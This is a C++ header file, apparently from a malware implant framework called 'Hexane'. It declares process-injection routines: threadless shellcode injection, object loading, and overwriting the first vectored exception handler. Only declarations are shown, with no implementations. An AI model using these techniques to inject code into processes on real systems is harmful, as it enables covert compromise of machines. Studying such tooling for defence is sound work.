#ifndef HEXANE_IMPLANT_INJECT_HPP
#define HEXANE_IMPLANT_INJECT_HPP

#include <core/corelib.hpp>
namespace Injection {
    struct _code {
        uint8_t* data;
        uint32_t length;
    };

    struct _threadless {
        char    *parent;
        char    *module;
        char    *exp;
        _code   *loader;
        _code   *opcode;
    };

    FUNCTION VOID Threadless(const _threadless &writer, void *shellcode, size_t n_shellcode, size_t total);
    FUNCTION VOID LoadObject(_parser &parser);

    namespace Veh {
        struct _veh_writer {
            void    *target;
            wchar_t *mod_name;
            char    *signature;
            char    *mask;
        };

        FUNCTION UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *signature, const char *mask);
        FUNCTION UINT_PTR PointerEncodeDecode(const uintptr_t &pointer, bool encode);
        FUNCTION LONG OverwriteFirstHandler(const _veh_writer &writer);
        FUNCTION LONG WINAPI Debugger(EXCEPTION_POINTERS *exception);
    }
}
#endif //HEXANE_IMPLANT_INJECT_HPP
